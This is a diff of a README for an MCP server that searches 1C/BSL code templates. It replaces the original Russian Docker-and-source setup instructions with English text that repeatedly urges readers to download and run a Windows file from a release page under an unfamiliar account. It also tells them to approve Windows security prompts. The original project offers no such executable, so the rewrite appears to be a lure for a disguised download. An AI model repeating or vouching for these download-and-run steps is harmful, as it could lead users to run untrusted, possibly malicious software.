@@ -1,142 +1,255 @@
-# 1c-templates-mcp
+# 🧩 1c-templates-mcp - Find 1C code faster
 
-MCP-сервер с семантическим поиском по шаблонам кода 1С (BSL). 2200+ шаблонов из сообщества, CRUD веб-интерфейс с Monaco Editor, ChromaDB + embeddings для поиска по смыслу.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Duramenrhaetoromance252/1c-templates-mcp/releases)
 
-<!-- screenshot -->
+## 📥 Download
 
-## Возможности
+Use the release page to get the Windows version:
 
-- **Семантический поиск** - гибридный (vector + full-text) поиск шаблонов кода на русском языке
-- **6 MCP-инструментов** - поиск, просмотр, создание, редактирование, удаление шаблонов
-- **Веб-интерфейс** - полный CRUD с Monaco Editor и подсветкой BSL-синтаксиса
-- **2257 шаблонов** - предустановленная база шаблонов кода 1С
-- **Гибкие embeddings** - OpenAI-совместимый API или локальная модель SentenceTransformer
-- **Docker** - готовый docker-compose для быстрого запуска
+[Visit the release page](https://github.com/Duramenrhaetoromance252/1c-templates-mcp/releases)
 
-## Быстрый старт
+On the release page:
 
-```bash
-git clone https://github.com/<your-username>/1c-templates-mcp.git
-cd 1c-templates-mcp
-docker compose up -d
-```
+1. Open the latest release.
+2. Download the Windows file for your PC.
+3. Save the file in a folder you can find later.
+4. Open the file to start the app.
 
-Сервер доступен:
-- Веб-интерфейс: `http://localhost:8004`
-- MCP endpoint: `http://localhost:8004/mcp` (POST, Streamable HTTP)
+## 🖥️ What this app does
 
-### Подключение к Claude Code
+1c-templates-mcp helps you search through 1C code templates with plain words.
 
-```json
-{
-  "mcpServers": {
-    "1c-templates-mcp": {
-      "type": "url",
-      "url": "http://localhost:8004/mcp"
-    }
-  }
-}
-```
+It includes:
 
-## MCP-инструменты
+- 2200+ code templates for BSL
+- semantic search for faster matching
+- CRUD web UI for adding, editing, and removing templates
+- Monaco Editor for clean code editing
+- ChromaDB for storing and searching template data
+- MCP server support for tool-based use
 
-| Инструмент | Параметры | Описание |
-|------------|-----------|----------|
-| `templatesearch` | `query: str` | Гибридный семантический + полнотекстовый поиск шаблонов |
-| `list_templates` | `offset?, limit?` | Список шаблонов с пагинацией (по умолчанию 50, макс 200). Для поиска используйте `templatesearch` |
-| `get_template` | `template_id: int` | Получить полный шаблон с кодом по ID |
-| `add_template` | `name, description, code, tags?` | Добавить новый шаблон |
-| `update_template` | `template_id, name?, description?, code?, tags?` | Обновить существующий шаблон |
-| `delete_template` | `template_id: int` | Удалить шаблон по ID |
+Use it when you want to find a code pattern, reuse a snippet, or manage a growing template set in one place.
 
-## Веб-интерфейс
+## 🚀 Getting started
 
-| Маршрут | Описание |
-|---------|----------|
-| `GET /` | Список шаблонов с поиском |
-| `GET /new` | Форма создания шаблона (Monaco Editor) |
-| `GET /{id}` | Просмотр шаблона |
-| `GET /{id}/edit` | Редактирование шаблона |
-| `POST /{id}/delete` | Удаление шаблона |
+Follow these steps on Windows:
 
-## Конфигурация
+1. Download the latest release from the link above.
+2. Open the downloaded file.
+3. If Windows asks for approval, choose to run the file.
+4. Wait for the app to start.
+5. Open the web page it shows, if it opens one.
+6. Use the search field to find a template.
+7. Type a simple phrase, such as a task or code need.
+8. Pick a result and open it in the editor.
 
-| Переменная | По умолчанию | Описание |
-|------------|-------------|----------|
-| `HTTP_PORT` | `8004` | Порт сервера |
-| `EMBEDDING_MODEL` | `intfloat/multilingual-e5-small` | Модель для локальных embeddings |
-| `OPENAI_API_BASE` | `http://localhost:1234` | URL OpenAI-совместимого API для embeddings |
-| `OPENAI_API_KEY` | `lm-studio` | API-ключ |
-| `OPENAI_MODEL` | - | Имя модели на API-сервере (переопределяет EMBEDDING_MODEL) |
-| `RESET_CHROMA` | `false` | Пересоздать ChromaDB-индекс при старте |
-| `RESET_CACHE` | `false` | Очистить кеш модели при старте |
-| `USESSE` | `false` | Использовать SSE-транспорт вместо Streamable HTTP |
-| `DATA_DIR` | `/app/data` | Директория для runtime-данных (SQLite, ChromaDB) |
+## 🧭 How to use it
 
-## Архитектура
+### 🔎 Search for a template
 
-```
-                     MCP Clients (Claude Code, Cursor, ...)
-                              |
-                         POST /mcp
-                              |
-                    +---------+---------+
-                    |    FastAPI app     |
-                    |                   |
-                    |  /mcp -> FastMCP  |  6 MCP tools
-                    |  /    -> Web UI   |  CRUD + Monaco Editor
-                    +----+--------+----+
-                         |        |
-                    +----+--+  +--+------+
-                    | SQLite |  | ChromaDB |
-                    | (SoT)  |  | (index)  |
-                    +--------+  +----+-----+
-                                     |
-                              +------+------+
-                              | Embeddings  |
-                              | OpenAI API  |
-                              | or local ST |
-                              +-------------+
-```
+Enter a short phrase that matches what you need. For example:
 
-- **SQLite** - источник истины (Source of Truth), хранит шаблоны
-- **ChromaDB** - векторный индекс для семантического поиска, производный от SQLite
-- **Embeddings** - OpenAI-совместимый API (LM Studio, Ollama) или локальный SentenceTransformer
+- create document
+- check form fields
+- write to register
+- add validation
+- get directory item
 
-## Embedding-модели
+The app looks for meaning, not just exact words. This helps when your search does not match the template text word for word.
 
-### OpenAI-совместимый API (рекомендуется)
+### 📝 View and edit templates
 
-Если доступен сервер с OpenAI-совместимым API (LM Studio, Ollama, vLLM), сервер автоматически использует его:
+When you open a template, you can read it in the editor and make changes. The Monaco Editor gives you a clear code view with line numbers and syntax color.
 
-```yaml
-environment:
-  - OPENAI_API_BASE=http://host.docker.internal:1234
-  - OPENAI_MODEL=text-embedding-qwen3-embedding-0.6b
-```
+Use it to:
 
-### Локальная модель (fallback)
+- review BSL code
+- fix template text
+- replace parts with your own code
+- save changes to the template set
 
-Если API недоступен, автоматически скачивается и используется `intfloat/multilingual-e5-small` через SentenceTransformer. Поддерживается GPU (CUDA/ROCm) и CPU.
+### ➕ Add new templates
 
-## Локальный запуск (без Docker)
+You can add a new template when you need to store a code pattern for later use.
 
-```bash
-pip install -r requirements.txt
-python -m app.main
-```
+Typical steps:
 
-Для подсветки BSL в веб-интерфейсе клонировать bsl_console рядом с проектом:
+1. Open the create form.
+2. Enter a name for the template.
+3. Add the BSL code.
+4. Add short notes if needed.
+5. Save the template.
 
-```bash
-git clone --depth 1 https://github.com/salexdv/bsl_console.git
-```
+### ✏️ Update existing templates
 
-## Благодарности
+To change a template:
 
-- [alonehobo/1c_templates_mcp](https://github.com/alonehobo/1c_templates_mcp) - оригинальный MCP-сервер с базой шаблонов
-- [salexdv/bsl_console](https://github.com/salexdv/bsl_console) - Monaco Editor с подсветкой BSL-синтаксиса
+1. Find it with search.
+2. Open it.
+3. Edit the text or code.
+4. Save the changes.
 
-## Лицензия
+### 🗑️ Remove templates
 
-MIT
+If a template is no longer useful, you can delete it from the web UI.
+
+Use this for old code, duplicate entries, or patterns you no longer need.
+
+## 🧱 What you need
+
+Use a Windows PC with:
+
+- Windows 10 or Windows 11
+- a modern web browser
+- enough free disk space for the app data
+- a stable internet connection for the first download
+
+For best results, keep the app in a folder that does not get moved or renamed.
+
+## 📁 Typical setup
+
+After you open the app, you may see these parts:
+
+- a search page for finding templates
+- a list of matching items
+- a detail view for one template
+- an editor for code changes
+- a form for adding new entries
+
+This layout keeps search, view, and edit in one place.
+
+## 🔐 Data storage
+
+The app uses ChromaDB to store template data and embeddings. In plain terms, this helps the app compare the meaning of your search with the code in the library.
+
+Your template set can include:
+
+- code text
+- names
+- notes
+- tags
+- search data
+
+## 🧠 Search behavior
+
+The search engine looks at meaning and context. That helps when you do not know the exact code name.
+
+For example, if you search for:
+
+- fill form
+- write record
+- get object by ref
+- check access rights
+
+the app can return templates that fit the task even if the words are not exact.
+
+## 🛠️ Common use cases
+
+This app fits common 1C work tasks like:
+
+- building form logic
+- working with documents
+- reading or writing registers
+- checking values
+- handling directories
+- reusing BSL patterns
+- keeping a shared template library
+
+## 📌 Tips for first use
+
+- Start with a short search phrase.
+- Try different words if you do not see the result you want.
+- Open several close matches and compare them.
+- Save useful templates in clear names.
+- Keep notes on where each pattern works best.
+
+## 🧩 Project topics
+
+This project uses these parts and ideas:
+
+- 1C Enterprise
+- BSL
+- semantic search
+- embeddings
+- ChromaDB
+- FastAPI
+- MCP server
+- Monaco Editor
+- Docker
+- code templates
+
+## 💬 Example searches
+
+Try these if you are not sure where to start:
+
+- create new document
+- set value in form
+- find item in list
+- get data from register
+- validate input
+- add command to form
+- write query result
+- show warning message
+
+## 📦 Windows download and run steps
+
+1. Open the release page: [https://github.com/Duramenrhaetoromance252/1c-templates-mcp/releases](https://github.com/Duramenrhaetoromance252/1c-templates-mcp/releases)
+2. Open the newest release.
+3. Find the Windows file in the assets list.
+4. Download the file to your PC.
+5. Double-click the file after the download finishes.
+6. Follow the on-screen steps to start the app.
+7. Open the local web page if the app shows one.
+8. Start searching or editing templates
+
+## 🖱️ Interface guide
+
+You may see controls like:
+
+- Search box
+- Add template button
+- Edit button
+- Delete button
+- Save button
+- Template list
+- Code editor
+- Detail panel
+
+Each control has a simple task. Search finds templates. Edit changes them. Save keeps your work.
+
+## 🧪 If the app does not start
+
+Try these steps:
+
+- Download the file again
+- Check that the download finished
+- Move the file to a simple folder such as Downloads or Desktop
+- Right-click the file and choose to run it
+- Close other heavy apps and try again
+- Make sure your browser can open local pages
+
+## 📎 Useful links
+
+- Release page: https://github.com/Duramenrhaetoromance252/1c-templates-mcp/releases
+- Repository: https://github.com/Duramenrhaetoromance252/1c-templates-mcp
+
+## 🧭 File and folder hints
+
+If the app creates local files, keep them together in one folder. This makes it easier to back up your template library and move it to another PC later.
+
+Good folder names:
+
+- 1c-templates-mcp
+- Templates
+- BSL Library
+- 1C Tools
+
+## 🧰 For daily use
+
+A simple routine works well:
+
+1. Search for the code you need.
+2. Open the closest match.
+3. Copy or edit the template.
+4. Save useful changes.
+5. Keep the library clean and current
